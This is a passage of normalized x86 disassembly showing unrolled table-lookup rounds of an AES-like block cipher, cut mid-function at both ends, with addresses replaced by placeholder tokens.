mov edx [ ebp - 0x24 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x8 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
mov eax [ ebp - 0x14 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp - 0x24 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
and eax 0xff
mov ecx [ ebp - 0x10 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0xc ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
mov eax [ ebp - 0x8 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
and edx 0xff
mov eax [ ebp - 0x20 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xff
mov ecx [ ebp - 0x1c ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x18 ]
and edx 0xff
mov eax [ ebp - 0x24 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x10 ]
and edx 0xff
mov eax [ ebp - 0xc ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx [ ebp - 0x14 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
and eax 0xff
mov ecx [ ebp - 0x20 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x20 ]
and ecx 0xff
mov edx [ ebp - 0x1c ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
and edx 0xff
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
and eax 0xff
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x8 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
mov eax [ ebp - 0x14 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp - 0x24 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
and eax 0xff
mov ecx [ ebp - 0x10 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0xc ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
mov eax [ ebp - 0x8 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
and edx 0xff
mov eax [ ebp - 0x20 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xff
mov ecx [ ebp - 0x1c ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x18 ]
and edx 0xff
mov eax [ ebp - 0x24 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x10 ]
and edx 0xff
mov eax [ ebp - 0xc ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx [ ebp - 0x14 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
and eax 0xff
mov ecx [ ebp - 0x20 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x20 ]
and ecx 0xff
mov edx [ ebp - 0x1c ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
and edx 0xff
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
and eax 0xff
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
mov [ ebp - 0x4 ] ecx
sub_402e58
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x4 ]
shl ecx 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
mov edx [ edx ]
xor edx [ eax + ecx * 4 + 0x68 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x4 ]
shl ecx 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
mov edx [ edx + 0x4 ]
xor edx [ eax + ecx * 4 + 0x6c ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x4 ]
shl ecx 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor edx [ eax + ecx * 4 + 0x70 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x4 ]
shl ecx 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
mov edx [ edx + 0xc ]
xor edx [ eax + ecx * 4 + 0x74 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x4 ]
lea edx [ ecx * 4 + 0x14 ]
mov eax [ ebp - 0x28 ]
lea ecx [ eax + edx * 4 + 0x108 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x28 ]
cmp [ edx + 0x4 ] 0x6
jbe r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx + 0x4 ] 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
